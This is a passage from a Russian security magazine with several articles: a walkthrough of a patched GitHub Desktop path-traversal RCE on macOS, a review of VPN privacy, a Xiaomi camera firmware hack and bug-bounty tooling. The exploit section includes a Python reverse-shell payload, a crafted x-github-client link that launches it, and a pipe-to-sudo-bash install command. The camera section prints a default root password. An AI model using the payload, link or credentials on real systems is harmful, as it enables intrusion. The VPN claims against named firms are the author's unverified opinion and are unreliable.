$ git submodule update ‐‐init ‐‐recursive
$ yarn install ‐‐force





         Установка зависимостей для компиляции GitHub Desktop

После этого переключаемся на команды из раз дела build_script.


/desktop-release-1.3.4-beta0/appveyor.yml
build_script:
  ‐ yarn lint
  ‐ yarn validate‐changelog
  ‐ yarn build:prod

Причем первые две можно пропустить и обойтись только последней.


$ yarn build:prod





     Успешная компиляция десктопного приложения GitHub под macOS

Теперь в директории /dist/GitHub Desktop‐darwin‐x64/GitHub Desktop.
app находится готовое приложение. Можно скопировать его в папку Applica‐
tions и запустить.





          Окно About приложения GitHub Desktop для macOS

Пройди начальную настройку, и стенд готов.


ДЕТАЛИ УЯЗВИМОСТИ
Посмотрим на исходники. Нас интересу ет, какие протоколы регистрирует
приложение.


/desktop-release-1.3.4-beta0/script/build.ts
160: // macOS
161: appBundleId: getBundleID(),
162: appCategoryType: 'public.app‐category.developer‐tools',
163: osxSign: true,
164: protocols: [
165:   {
166:     name: getBundleID(),
167:     schemes: [
168:       isPublishableBuild
169:         ? 'x‐github‐desktop‐auth'
170:         : 'x‐github‐desktop‐dev‐auth',
171:       'x‐github‐client',
172:       'github‐mac',
173:     ],
174:   },
175: ],

Интерес представляет схема x‐github‐client. С ее помощью ты можешь
общаться с приложением, отправлять различные команды и запросы, а они
будут обработаны согласно зашитой логике. Пос мотрим, какие методы мож‐
но использовать через данную схему.


/desktop-release-1.3.4-beta0/app/src/lib/parse-app-url.ts
073: export function parseAppURL(url: string): URLActionType {
074:   const parsedURL = URL.parse(url, true)
075:   const hostname = parsedURL.hostname
...
083:   const actionName = hostname.toLowerCase()
084:   if (actionName === 'oauth') {
...
104:   if (actionName === 'openrepo') {
...
138:   if (actionName === 'openlocalrepo') {

Давай заценим живой пример общения с дес ктопным приложением. Сначала
авторизуемся и в приложении, и в браузере одним и тем же пользовате лем.
Теперь откроем любой репозиторий на гитхабе. Я открою свой, потому что я
нарцисс. Обрати внимание на кноп ку клонирования — ее можно раз вернуть.
Под катом расположились опции, среди которых Open in desktop. Если
открыть консоль разработчика и посмотреть на ссылку данной кнопки, то уви‐
дишь нашу схему x‐github‐client для общения с приложением.





      Ссылка на открытие репозитория в десктоп ном клиенте GitHub

С помощью метода openrepo попробуем открыть репозиторий в приложении,
и если его  нет,  то всплывающее окошко предложит его клонировать
на локальную машину. Сделаем это.





        Клонирование репозитория в приложение GitHub Desktop

Подобная иконка име ется и при прос мотре отдельных файлов репозитория.





  Ссыл ка на открытие отдельного файла репозитория в приложении
  GitHub

Здесь она имеет уже более интересный вид:


x‐github‐client://openRepo/https://github.com/allyshka/
scripts?branch=master&filepath=pam_steal%2FREADME.md

В параметре filepath расположился путь до файла относительно репози‐
тория. Если репозиторий уже кло ниро ван и файл имеется на дис ке, то
при обработке такой ссылки откроется Finder в соот ветс твующей папке.


/desktop-release-1.3.4-beta0/app/src/lib/parse-app-url.ts
104: if (actionName === 'openrepo') {
105:   const probablyAURL = parsedPath
106:
107:   // suffix the remote URL with `.git`, for backwards compat
ibility
108:   const url = `${probablyAURL}.git`
109:
110:   const pr = getQueryStringValue(query, 'pr')
111:   const branch = getQueryStringValue(query, 'branch')
112:   const filepath = getQueryStringValue(query, 'filepath')
...
129:   return {
130:     name: 'open‐repository‐from‐url',
131:     url,
132:     branch,
133:     pr,
134:     filepath,
135:   }


/desktop-release-1.3.4-beta0/app/src/lib/dispatcher/dispatcher.ts
841: case 'open‐repository‐from‐url':
842:   const { pr, url, branch } = action
...
846:   const branchToClone = pr && branch ? null : branch || null
847:   const repository = await this.openRepository(url, branch
ToClone)
848:   if (repository) {
849:     this.handleCloneInDesktopOptions(repository, action)


/desktop-release-1.3.4-beta0/app/src/lib/dispatcher/dispatcher.ts
928: private async handleCloneInDesktopOptions(
929:   repository: Repository,
930:   action: IOpenRepositoryFromURLAction
...
959:   if (filepath != null) {
960:     const fullPath = Path.join(repository.path, filepath)
961:     // because Windows uses different path separators here
962:     const normalized = Path.normalize(fullPath)
963:     shell.showItemInFolder(normalized)
964:   }


/desktop-release-1.3.4-beta0/app/src/lib/app-shell.ts
14: export const shell: IAppShell = {
...
29:   showItemInFolder: path => {
30:     ipcRenderer.send('show‐item‐in‐folder', { path })
31:   },


/desktop-release-1.3.4-beta0/app/src/main-process/main.ts
362: ipcMain.on(
363:   'show‐item‐in‐folder',
364:   (event: Electron.IpcMessageEvent, { path }: { path: string })
=> {
365:     Fs.stat(path, (err, stats) => {
...
371:       if (stats.isDirectory()) {
372:         openDirectorySafe(path)
373:       } else {
374:         shell.showItemInFolder(path)
375:       }
376:     })
377:   }

«Вижу путь — пробую path traversal» — таков девиз. Немного поигравшись
с параметром, обнаруживаем, что уяз вимость данного типа действительно
присутствует. Например, при переходе по такой ссылке будет запущен каль‐
кулятор:


x‐github‐client://openRepo/https://github.com/allyshka/
scripts?branch=master&filepath=../../../../../../../../../../../
Applications/Calculator.app

Все потому, что проверка stats.isDirectory() отрабаты вает в macOS, так
как там приложения — это обычные папки, которые по‐особенному обра‐
батываются системой. А дальше в теле функции openDirectorySafe вызыва‐
ется встроенный во фреймворк Еlectron метод openExternal, где в качестве
аргументов используется схема file:/// и переданный filepath.


/desktop-release-1.3.4-beta0/app/src/main-process/shell.ts
2: import { shell } from 'electron'
...
13: export function openDirectorySafe(path: string) {
14:   if (__DARWIN__) {
15:     const directoryURL = Url.format({
16:       pathname: path,
17:       protocol: 'file:',
18:       slashes: true,
19:     })
20:
21:     shell.openExternal(directoryURL)
22:   } else {
23:     shell.openItem(path)
24:   }
25: }

Теперь взглянем на патч‐коммит под символичным названием macOS is a
special.





           Патчи RCE‐уязвимости в клиенте GitHub для macOS


/desktop-release-1.3.4-beta1/app/src/main-process/main.ts
371: if (!__DARWIN__ && stats.isDirectory()) {
372:   openDirectorySafe(path)

Добавленная проверка теперь не дает методу openExternal отработать
в macOS.
  Для эксплуатации уязвимос ти с минимальным учас тием юзера, в один
клик, нужно, чтобы у пользователя уже был клонирован твой репозиторий
и стояла опция, которая по дефолту раз реша ет открывать ссыл ки типа x‐
github‐client в GitHub Desktop.
  Простейший пейлоад мож но накидать в виде скрипта на Python.


poc.py
import socket,subprocess,os;
os.system("open ‐a calculator.app")
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("localhost",1337));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","‐i"]);

Здесь мы открываем калькулятор для нагляднос ти и кидаем бэкконнект
на порт 1337. Скомпилиру ем код в приложение при помощи PyInstaller.


curl https://bootstrap.pypa.io/get‐pip.py ‐o get‐pip.py
python get‐pip.py ‐‐user
pip install pyinstaller ‐‐user
pyinstaller ‐w poc.py
mv dist/poc.app/ .

Затем создаем репозиторий, в который кладем наше приложение‐пейлоад.
Теперь нужно заставить пользователя кликнуть на ссылку, которая клонирует
его и запустит нужную полезную нагрузку.
  Для этих целей Андре Бап тиста сделал при ятную HTML‐страничку. Ссылка
ведет на его репозиторий, в котором лежит такое же приложение, что мы ком‐
пилировали выше.


x‐github‐client://openRepo/https://github.com/0xACB/
github‐desktop‐poc?branch=master&filepath=osx/evil‐app/rce.app





                    Экспло ит для GitHub Desktop

После клика на Clone экс плоит успешно отра батывает.





       Успешная эксплуата ция приложения GitHub Desktop в macOS


ДЕМОНСТРАЦИЯ УЯЗВИМОСТИ (ВИДЕО)





ВЫВОД
Итак, мы разобрались в уязвимос ти приложения GitHub, которое написано
на Electron, и научились экс плуатировать ее. Ты узнал, что клик по безобид‐
ной ссылке может привести к полной компро метации сис темы. Думаю, что
в коде этого клиента мож но найти еще много чего интерес ного, так что дер‐
зай — ребята дают неплохие воз награждения. А пока обновляйся и не кликай
на подозрительные ссылки.
ПРИВАТНОСТЬ

  МЕДВЕЖЬИ
  СЕРВИСЫ





      ПРОВЕРЯЕМ 7 ПОПУЛЯРНЫХ
    ПРОВАЙДЕРОВ VPN НА ПРЕДМЕТ
           ПРИВАТНОСТИ





В наше время без VPN никуда: аноним‐
ность, безопас ность и возможность обойти
региональные ограничения и блокировки
приводят к этой технологии не только тех‐
                                                                        Вольдемар Берманнически подкованную публику, но и людей                                                                                     VoldemarBerman@protonmail.ch
попроще. А они, конечно же, не будут ста‐
вить и настраивать OpenVPN на сво ем сер‐
вере  и  предпочтут  услуги  про вайдера.
Какой выбор нас ждет  в таком  случае
и можно ли доверять про вайдерам VPN?
Давай пройдем ся по наиболее известным
из них и проверим.


Сначала определимся с критериями, на которые будем смотреть. Я пред‐
лагаю выдвигать такие требова ния.
 • SSL‐сертификация доменов. Если с ней есть проблемы, то возможны ата‐
   ки типа MITM.
 • Отсутствие подстав в лицензионном соглашении. Провайдер, для которо‐
   го приватность поль зователей не пус той звук, не должен пытаться зас‐
   тавить тебя соглашаться на что угод но.
 • Поддержка стой кого шифрования и современных протоколов. В некото‐
   рых странах при помощи DPI‐аппа рату ры успешно блокируются стандар‐
   тные типы подклю чения, такие как PPTP, L2TP IKEv1, OpenVPN UDP и про‐
   чие. Уважающий себя провайдер должен предос тавлять пути обхода. Что
   касается шиф рования, здесь все индивиду аль но. Отме чу лишь, что про‐
   токол PPTP, исполь зуемый вку пе с MS‐CHAP, был взломан в 2012 году.
  С тех пор любой человек, заплатив 17 дол ларов, имеет воз можность
  дешифровать трафик.


CYBERGHOST VPN
CyberGhostVPN — немецко‐румынский сервис, ведущий свою деятельность
с 2007 года. Немногие оста ются на плаву столько вре мени. Этот сервис
предлагает три типа под клю чения: L2TP, OpenVPN, IPSec.





                           CyberGhost VPN

Способы обхода блокировок отсутс тву ют. Есть лишь возможность подклю‐
чения по протоколу TCP на 443‐м порте при исполь зовании OpenVPN, что уже
неэффектив но в странах с DPI. SSL‐сертификат ресурсу выдан компанией
Comodo и действителен до 23.02.2019.
  Два года назад CyberGhost оказался в центре скандала. Одно из обновле‐
ний его клиента устанавливало на машины поль зователя корневой SSL‐сер‐
тификат. Чем это плохо? Дело в том, что, когда ты устанавливаешь соеди‐
нение по HTTPS, твои данные защищаются протоколом SSL/TLS, который
подтверждается специальным сертификатом, выданным упол номоченной
компанией. Браузер сверяется со списком сертифика тов ОС и, если все схо‐
дится, разрешает вой ти на сайт. Обновление CyberGhost добавляло свой
сертификат в этот список, что открыло воз можность атаки типа man in the
middle.
  Компания поспешила выпустить опро вержение, однако позже вскрылась
другая проблема: фирменный клиент для Windows логиру ет системные дан‐
ные компьютера, такие как наз вание видеочипа, модель процессора и имя
пользователя. Что тут ска зать? Репута ция подпорчена.
   Что касается Privacy Policy, тут все очень интересно. В статье из своей
базы знаний руководство сервера отчетливо и без ужимок заявляет о том, что
логи не ведутся. Однако просмотр «политики конфиденциальнос ти» выз вал
у меня определенные вопросы.





              Политика безопас ности CyberGhost VPN

В «анонимизацию» IP верится с трудом, да и остальное не вызывает теплых
чувств. Любой сбор данных противоречит ответу в базе знаний, где заявлено,
что логов нет.


NORDVPN
NordVPN — стремитель но набира ющий популярность сервис, зарегис три‐
рованный в Литве. Ведет деятельность с 2013 года. В графе «Наши партне‐
ры» раньше было указано, что контора получи ла CCNP‐сертификат от CISCO,
но потом эта информация пропала с сай та.





                 Сер тификат CISCO с веб‐архива





                  Графа «Партнеры» без сертификата

Почему информация о сертифика те пропала с сайта? Как удалось получить
этот сертификат, не имея никаких зас луг? Ответов нет, и убрали явно
не просто так.
  В «Политике конфиденциальности» тоже нашлись проблемы. Один пункт
гласит, что логи не ведут ся вообще, другой говорит нам, что сервис имеет
право хранить ограниченное количес тво (сколь ко?) личной информации
в течение двух лет.





              Политика конфиденциальнос ти NordVPN

На сайте утверждается, что пул серверов сос тоит из 5178 единиц, которые
расположены в 62 стра нах. Используемые методы подключения: OpenVPN,
L2TP, IPSec. Приятный бонус — воз можность обхода DPI через stunnel.
  С NordVPN все было бы хорошо, если бы не история с сертификатом CIS‐
CO и не лицензионное соглашение, которое разрешает владельцам сервиса
собирать информацию, но не конкретизи рует, какую именно.
  Но есть и еще один интерес ный момент. Двое пользователей Reddit пред‐
приняли независимое исследование, судя по которому NordVPN принад‐
лежит известной датамайнинговой компании TesoNet.
  Похоже, именно это позволяет сервису тра тить по полмиллиона долларов
в месяц (только вдумайся в эту цифру!) на покуп ку отзывов и рекламы своего
продукта. Так, по данным сайта adweek.com, NordVPN потратил на рек‐
ламу 497 тысяч дол ларов за один лишь февраль 2018 года. Отку да такие
деньги? Думаю, ответ очевиден.
  Выходит, пользовать ся этим сервисом крайне опас но: вместо аноним‐
ности есть шанс предоставить подробные логи для датамайнинга. И напос‐
ледок еще одна неприятная история. В рекламном порыве сотрудники Nord‐
VPN накрутили рейтинг подложным отзывам на сайте trustpilot.com. Этот факт
подтвержден администрацией ресурса.





                     Накрутка отзывов NordVPN


PRIVATE INTERNET ACCESS
Private Internet Access — широко известный среди зарубежных пентестеров
VPN‐сервис. Среди ана логов выделяется детальными нас тройками шиф‐
рования (можно менять порт подключения, тип шифровки и ключа), наличием
встроенных способов обхода DPI, а также своего SOCKS5‐прокси и SSH‐тун‐
неля. Одним словом, хоть сейчас медаль давай, но увы…
   Во‐первых, web.archive.org ничего не знает о времени существования это‐
го сервиса и о старых версиях сайта. Похоже, администрация попросила их
удалить, а это тревожный знак.





                  Результаты поиска в веб‐архиве

Мне удалось обнаружить, что этот провайдер находит ся на территории США,
а также принадлежит неко ему псевдоконгломера ту, область деятельности
которого раскидывается от VPN до бутиков.
   Да, у Private Internet Access есть воз можность шифрования 4096‐битным
клю чом. Да, он спокой но кладет на лопатки DPI, но какой в этом смысл, если
по первому зову Дяди Сэма все данные ока жутся в руках властей?





                    Ин формация о сервисе

Попробуем поискать информацию о фир ме‐хозя ине — London Trust Media.
Поиски быстро привели меня к статье, сооб щающей, что исполнительным
директором этой компании был наз начен Марк Карпелес (Mark Karpeles),
при полном попустительстве которо го была ограблена японская криптобиржа
Mt.Gox. Доверия к этому товарищу у меня нет и быть не может.


HIDEME VPN
HideME — самый известный в рунете VPN‐сервис. Ведет деятельность
с 2007 года. Авторизоваться можно, только если есть цифровой код, который
Google легко находит на тематических форумах.
  Один из типов подклю чения к HideME VPN — это PPTP, что само по себе
нехорошо — про токол уяз вим. Кро ме того, в 2016 году по запросу властей
РФ HideME отклю чил анонимайзер для рос сийских пользователей. На этом
можно было бы и остановиться, но я предлагаю еще заглянуть в политику кон‐
фиденциальности.





            Политика конфиденциальнос ти HideME VPN

Да, может быть, они и отказались от регистрации, но ключи, абсолютно ничем
не хешированные, при должной сноровке можно подобрать за три дня. Кроме
того, обрати внимание на первый абзац, а также на то, как был отработан
запрос РКН. Использования этого сервиса для чего‐то, кроме доступа к Spo‐
tify, стоит избе гать любой ценой.


HIDE MY ASS! VPN
Hide My Ass — один из самых известных провайдеров в мире. При надлежит
он компании Avast. Мно гих это отпугнет сра зу же, но мы продолжим изучение.
Сервис существует в качес тве анонимайзера с 2005 года, функция VPN у него
появилась в 2009‐м. Грандиоз ное отличие Hide My Ass от всех рассмот‐
ренных провайдеров — колос сальное количество выходных стран. Однако,
к большому сожале нию, радоваться тут нечему.
  В 2011 году этот провайдер выдал властям США одного из участников
группировки LulzSec — Коди Эндрю Кретзингера. Мало того, админис тра‐
торы еще написали длин ный пост в свое оправдание. Выдача логов якобы
была обоснованной. Но на месте этого человека мог быть любой журналист
или же правозащитник в тоталитарной стра не.





                    Пост оправда ния Hide My Ass

Вывод напрашивается сам собой: Hide My Ass в любой момент выдаст то
самое, что обещал надежно спря тать, а потому не годится для серьезных
применений.


PUREVPN
PureVPN — еще один популярный про вай дер, созданный в 2008–2009 годах.
Набор протоколов стандартный: OpenVPN, L2TP, IPSec. Прославился PureVPN
тем, что выдал властям назойливого киберсталкера Эндрю Лина (мы писали
об этой истории). С точки зрения морали мож но относиться к этой истории
как угодно, но факт налицо: логи хра нятся.


VYPRVPN
VyprVPN начал активную деятельность в 2010 году. Зарегистрирован в Швей‐
царии. Имеет стандартный набор про токолов: OpenVPN (AES‐256), IPSec,
L2TP. Радует наличие обхо да через stunnel, который маркетологи гордо име‐
нуют Chameleon — оставим это на их совес ти.
  Нас же интересует лицензионное соглашение, которого вполне достаточ‐
но для выводов.





              Политика конфиденциальнос ти VyprVPN

В течение тридцати дней хранится вход ной (нас тоящий) IP‐адрес, и этим все
сказано.


ВЫВОД
Получается, что ни один из изу ченных нами популярных VPN‐сервисов
не прошел даже элементарную проверку без применения технического ауди‐
та. Лично для меня это зна чит, что веры таким провайдерам нет и быть
не может. Поэтому всем, кто беспокоится об анонимности и приватности,
советую все‐таки изучить документацию и поднять свой сервер OpenVPN.
А для обхода DPI можешь самос тоятельно добавить stunnel — у нас есть под‐
робная статья о том, как это сделать.
ТРЮКИ
 ХАК
     XIAOMI CAMERA ДЛЯ





  ПОЛУЧАЕМ КОНТРОЛЬ НАД ДЕШЕВОЙ
 И ПРАКТИЧНОЙ КАМЕРОЙ НАБЛЮДЕНИЯ
        И ПРИУЧАЕМ ЕЕ К IOS




Китайская фирма Xiaomi знаменита не толь‐
ко своими мобильными телефо нами, но и
недорогими  гаджетами,  выбор  которых
ширится с каждым годом. Одна проблема:
работают они зачастую только с фирменны‐          Виталий Юркин                                                                                   Инженер‐программист
ми приложениями и хабами. В этой статье я             aivs@yandex.ruумного дома
покажу, как модифициро вать камеру Xiaomi
Small Square Smart Camera ценой 25 дол‐
ларов, чтобы сначала заполучить доступ
ко всему интересному, а затем интегри‐
ровать в экосис тему Apple.


Small Square Smart Camera — это небольшая камера, которая подключается
по Wi‐Fi и снимает качественное видео в раз решении 1920×1080 с хорошим
углом обзора. Помимо это го, имеется ИК‐подсветка для ночной съемки,
удобное магнитное крепление, поддержка карт памяти до 64 Гбайт, порт USB
для внешнего накопителя, динамик и микрофон для двухсторонней связи.
В общем, при цене меньше двух тысяч руб лей — более чем прилично.





                     Xiaomi Small Square Smart Camera

Большой минус этой камеры в том, что работать с ней предполагается только
из приложе ния Mi Home. А зна чит, видеопоток не получится ни в серьезную
систему наблюдения направить, ни интегрировать с эппловским HomeKit.
Однако благодаря усилиям энтузиас тов все эти недос татки удалось устра‐
нить!


РАЗБИРАЕМ КАМЕРУ И ЧИТАЕМ ЛОГИ ПО UART
Внутри у камеры — чип ARM9, на котором работа ет обычный Linux. Наша
цель — поставить прошивку, которая даст нам контроль над системой и поз‐
волит передавать видеопоток в формате RTSP. Но для начала я рекомендую
подклю читься через отла дочный порт UART, чтобы иметь возможность смот‐
реть лог на предмет ошибок.
   Итак, вытаскиваем карту памяти, откру чива ем два винта и вытаскиваем
нижнюю часть на себя.





         Если все прошло успешно, ты увидишь нечто подобное

Далее:
 • растаскиваем корпус в разные стороны;
 • отсоединяем антенну Wi‐Fi;
 • откручиваем три винта внутри;
 • отсоединяем шлейф камеры.

Доступ к UART получен!





                        Дос туп к UART

Обрати внимание, что TTL‐уро вень UART — 3,3 В (чип работает от 3,3 В),
а сама камера питается от USB 5 В. Самым правильным решением будет
подклю читься только к GND, TX, RX, а питание подать через USB.
   Теперь подпаиваем три проводка и подключаем переходник USB — UART.





                       USB — UART

С помощью программы minicom или PuTTY получаем права root.
 • Скорость соединения: 115200
 • Логин: root
 • Пароль: ismart12

Если вставить флешку, когда камера работа ет, то камера должна ее увидеть,
подмонтировать и запус тить скрипт модификации прошивки. При любых сис‐
темных действиях в консоль выводится лог.





МОДИФИЦИРУЕМ ПРОШИВКУ КАМЕРЫ ДЛЯ РАБОТЫ RTSP
Последняя версия прошивки, которую можно модифицировать с помощью
fang‐hacks, — это 3.0.3.56. Поэто му прежде всего нужно сде лать даунгрейд.
 1. Скачиваем прошив ку XiaoFang_FWv3.0.3.56.
 2. Форматируем карту памяти microSD в FAT32.
 3. В корень карты распаковываем архив с файлами прошивки.
 4. Отключаем питание камеры.
 5. Вставляем карту памяти в камеру.
 6. Нажимаем и удерживаем кнопку Setup на камере.
 7. Вклю чаем питание камеры, удерживаем кнопку Setup.
 8. Примерно через две минуты камера поприветствует тебя на китайском.

Даунгрейд прошив ки закончен, можно переходить к примене нию хака.
  Из репозитория проекта fang‐hacks ска чиваем fanghacks_v0.2.0. Это спе‐
циально подготовленный образ с дву мя разделами: загрузочным FAT32 и сис‐
темным ext2. С помощью утилиты dd или другой программы заливаем образ
на карту памяти.





 1. Вклю чаем камеру без карты памяти.
 2. Дожидаемся, когда синий светодиод перестанет мигать и будет прос то
   гореть.
 3. Вставляем карту, камера должна издать характерный звук. Если это не
   произошло, смотрим лог на ошибки подключения карты памяти.
 4. Автоматически запустится скрипт snx_autorun.sh , ждем секунд трид‐
   цать.

Прошивка модифицирована, теперь можно активировать  хак, для этого
заходим по адре су http://device‐ip/cgi‐bin/status и нажимаем Apply.





Возможности, которые дает нам хак:
 • RTSP‐видеопоток;
 • отвязка от китайского облака;
 • настройка Wi‐Fi в качес тве клиента или точки доступа;
 • FTP, Telnetd, SSH/SCP/SFTP;
 • установка правильного времени.

Поддержка RTSP означает, что видео можно будет смотреть в любом при‐
ложении для работы с камерами. Протестировать это можно с помощью VLC.
В меню «Файл» выбира ем «Открыть сеть» и переходим по адресу rtsp://
адрес_устройства/unicast.





                              VLC


ПОДНИМАЕМ HOMEBRIDGE И ПЛАГИН ДЛЯ КАМЕРЫ НА RASPBER-
RY PI
Если ты собираешь систему видеонаблюдения, то ты, скорее всего, уже зна‐
ешь, что делать с потоком RTSP. Однако если ты хочешь задействовать
камеру в своем умном доме, а в кармане носишь айфон, то читай дальше: я
расскажу, как сделать из любой обычной камеры устройство с поддержкой
Apple HomeKit. Как и в случае с лампочками, для этого удобно использовать
программку под названием Homebridge.
   Homebridge — это плагин для Node.js, поэтому сначала нужно установить
стабильную версию Node.js. Весь софт будет кру титься на Raspberry Pi 3
Model B с операционкой Raspbian Stretch. Raspberry Pi — иде альный вариант
для этого проекта, потому что видео с камеры нужно будет на лету переко‐
дировать в H.264. Мини‐компь ютер умеет это делать аппаратно.


$ wget ‐O ‐ https://raw.githubusercontent.com/sdesalas/node‐pi‐zero/
master/install‐node‐v.lts.sh | sudo bash


             INFO

                        Raspberry  Pi можно задейство вать и для пол‐
                      ноценной домашней автоматизации на Z‐Wave
                      или ZigBee. Об этом я уже писал в статье «Под‐
                     ключить все! Делаем экстремально дешевый хаб
                       для устройств ZigBee и Z‐Wave».





                             Raspberry Pi 3

Для установки расширений из менеджера пакетов npm нужно установить ути‐
литы для сборки:


$ sudo apt‐get install ‐y build‐essential

Теперь ставим сам homebridge:


$ sudo npm install ‐g ‐‐unsafe‐perm homebridge

Для использования аппаратного видеокодирования на Raspberry Pi нужно
скомпилировать FFmpeg с соот ветс твующими флагами. Что ж, за дело!
   Ставим утилиты, необ ходимые для сборки:


$ sudo apt‐get install pkg‐config autoconf automake libtool
libx264‐dev git

Скачиваем и устанавлива ем fdk‐aac.


$ git clone https://github.com/mstorsjo/fdk‐aac.git
$ cd fdk‐aac
$ ./autogen.sh
$ ./configure ‐‐prefix=/usr/local ‐‐enable‐shared ‐‐enable‐static
$ make ‐j4
$ sudo make install
$ sudo ldconfig
$ cd ..

Скачиваем и устанавлива ем FFmpeg.


$ git clone https://github.com/FFmpeg/FFmpeg.git
$ cd FFmpeg
$ ./configure ‐‐prefix=/usr/local ‐‐arch=armel ‐‐target‐os=linux
‐‐enable‐omx‐rpi ‐‐enable‐nonfree ‐‐enable‐gpl ‐‐enable‐libfdk‐aac
‐‐enable‐mmal ‐‐enable‐libx264 ‐‐enable‐decoder=h264 ‐‐enable‐network
 ‐‐enable‐protocol=tcp ‐‐enable‐demuxer=rtsp
$ make ‐j4
$ sudo make install

Устанавливаем плагин homebridge‐camera‐ffmpeg.


$ sudo npm install ‐g homebridge‐camera‐ffmpeg

Создаем файл конфигурации /home/pi/.homebridge/config.json1, содер‐
жащий код:


{
  "bridge": {
      "name": "Homebridge",
      "username": "CC:22:3D:E3:CE:34",
      "port": 51826,
      "pin": "031‐45‐154"
  },
  "description": "My Home",
  "accessories": [],
  "platforms": [{
      "platform": "Camera‐ffmpeg",
      "cameras": [
        {
          "name": "Camera Name",
          "videoConfig": {
            "source": "‐rtsp_transport tcp ‐re ‐i rtsp://192.168.1.3/
unicast",
            "stillImageSource": "‐i rtsp://192.168.1.3/unicast",
            "maxStreams": 2,
            "maxWidth": 1280,
            "maxHeight": 720,
            "maxFPS": 10,
            "vcodec": "h264_omx",
            "debug": true
          }
        }
      ]
    }
  ]
}

Запускаем Homebridge c выводом дебага: DEBUG=* /opt/nodejs/bin/home‐
bridge.





                               HKStarted

При запуске Homebridge в лог пишется, что загружается одна платформа
Camera‐ffmpeg, выводится QR‐код и цифровой код для добавления камеры
в «Дом» на iOS. В режиме debug можно пос мотреть процесс добавления
камеры, все ли проходит по плану. При работе камеры в лог выводятся сооб‐
щения о процессе декодирования, а также информация о том, что исполь‐
зуется аппаратное декодирование.


        WWW

                     На странице проекта можно более подробно
                        почитать  про  настройку  конфига.  Например,
                       для увеличения скорости работы можно умень‐
                      шить  разрешение  видео  или  снизить  FPS.
                      Это  пригодится,  если  камера  сто ит  далеко
                         от роутера и сигнал Wi‐Fi слабый.



ЗАВОДИМ КАМЕРУ В «ДОМ» ЧЕРЕЗ HOMEKIT
Начиная с iOS 10 в iPhone и iPad появи лось при ложение «Дом», которое поз‐
воляет управлять устройства ми умного дома по протоколу HomeKit. Чтобы
добавить камеру в «Дом», нуж но нажать плюсик, выбрать «Нет кода или не
можете сканировать?», тогда из списка можно будет добавить только камеру.





                     Добавляем камеру

Без дополнительных устройств видео с камеры мож но будет смотреть, если
твой телефон или планшет находятся в той же сети. Однако если у тебя есть
хаб HomeKit (в его роли могут выступать HomePod, Apple TV или iPad), то кар‐
тинка будет передаваться на сервер Apple, и ты сможешь смотреть, что про‐
исходит у тебя дома, находясь где угодно.
ТРЮКИ

АРСЕНАЛ
      БАГХАНТЕРА





                                                             Лука Сафонов
                                                        Руководитель лаборатории практического анализа
                                                    защищенности компании «Инфосистемы Джет»
                                                                      luka.safonov@gmail.com


ПОДБИРАЕМ СОФТ
ДЛЯ БЫСТРОГО ПОИСКА
УЯЗВИМОСТЕЙ ПРИ УЧАСТИИ
В BUG BOUNTY





Не всегда самые дорогие баги, обна руженные в рамках
баг‐баунти, — это классика типа XSS/SQL или ошибки
логики работы приложения. Утечка логов, доступ к критич‐
ным файлам и сервисам без авто ризации, сессион ные
и авторизационные токены, исходные коды и репозитории —
все  это  может  быть  использовано  злоумышленниками
для успешных атак, поэтому и пла тят за такие штуки тоже
неплохо. Я рас скажу о полезных утилитах, которые помогут
в выявлении уязвимостей.



      У нас было два мощ ных веб‑кра уле ра, 1 174 991 домен баг‑баунти,
      семь хедеров для обхода WAF, свой сер вер в Digital Ocean на слу чай
      блокиров ки IP, список из 50 сис темных дирек торий для поис ка и куча
      дополнительных  мелких  проверок  на  XSS,  CRLF,  open  redirect
      и админки с прос тыми паролями... Не то чтобы все это было нужно
      в багхантинге, но если уж взялся автоматизировать поиск багов, то
      надо идти до конца.
     — В. Поляков (JohnDoe1492)

Например, недавно была обна родована утечка авторизационного токена
Snapchat для обращения к API. Уяз вимость была оценена в 15 000 дол ларов
США, при этом сам багхантер ожидал лишь ста туса informative и более скром‐
ной награды.
  Из своего опыта и опыта коллег могу сказать, что даже за server‐status, ph‐
pinfo или лог‐файлы выплата может достигать 1000 долларов. Хорошо, ска‐
жешь ты, но ведь искать все это вручную доволь но утомительно и малоп‐
родуктивно, да и наверняка кто‐то дру гой уже нашел все баги. Представь
себе, далеко не так! Баги встречаются повсемес тно, компании обновляют
или выкатывают новые сервисы, раз работчики забывают отключить журналы
отладки или удалить репозитории.


ПРАВИЛА
В первую очередь советую вниматель но ознакомиться с правилами прог‐
раммы, в которой ты хочешь принять учас тие: чем больше скоуп, тем шире at‐
tack surface и выше возможность что‐нибудь найти. Тем не менее стоит обра‐
щать внимание на принадлежность сервисов к тем или иным доменам. Нап‐
ример, программы баг‐баунти обычно не охватывают домены, принад‐
лежащие третьей стороне. Впрочем, если есть шанс, что это повлияет
на основные сервисы, можешь рассчитывать на повыше ние рейтинга
на Hacker1 и денежную компенса цию.
  Из российских компаний я бы отметил Mail.Ru Group. Это лояльная коман‐
да, которая быстро отвечает и принимает баги. Хотя поставили мне несколь‐
ко n/a.


           WARNING

                    Важное напоминание! Когда ты найдешь  баг,
                      не докручивай его до финала, если тебя не поп‐
                        росят об этом специально. Не нуж но дампить
                         базу, дефейсить сайт или каким‐то образом вли‐
                         ять на пользователей. Тот, кто принима ет у тебя
                           баг, обычно и сам в состоянии довести дело
                      до логического кон ца.


Еще один совет начинающим: не стоит выпрашивать деньги у компаний. Объ‐
ективные баги они оценят по достоинству, опыта у них, скорее все го, гораздо
больше, чем у тебя.


ГОТОВИМ ПЛАЦДАРМ
Для более эффектив ного багхантин га нам необходимо мониторить изме‐
нения на периметре компании — это поз волит оперативно обнаруживать
новые сервисы или новые версии веб‐при ложений. Также мониторинг может
быть полезен, если у тебя есть команда — вы сможете обме ниваться
информацией при совместной охоте.


Serpico
https://github.com/SerpicoProject/Serpico
  Первое, что нам понадо бит ся, — система хранения и описания багов.
В свое время я исполь зовал Dradis, но сейчас пред почитаю Serpico. Эта
программа позволяет заносить баги по классификациям и сразу подтягивает
их  описание. Все  это  прекрасно  кастомизи руется  и масштабируется
для командной работы.
  Фреймворк работает в Linux/Win‐среде, есть контейнер Docker для раз‐
вертывания.





Nmap-bootstrap-xsl
https://github.com/honze‐net/nmap‐bootstrap‐xsl/
   Нет, читатель, я не считаю тебя мамкиным хакером, который не знает
про Nmap. Но мы будем использовать еще и отличный аддон для работы
с журналами сканирований nmap‐bootstrap‐xsl. Он позволяет конверти‐
ровать результаты сканирований в HTML с удоб ным интерфейсом и воз‐
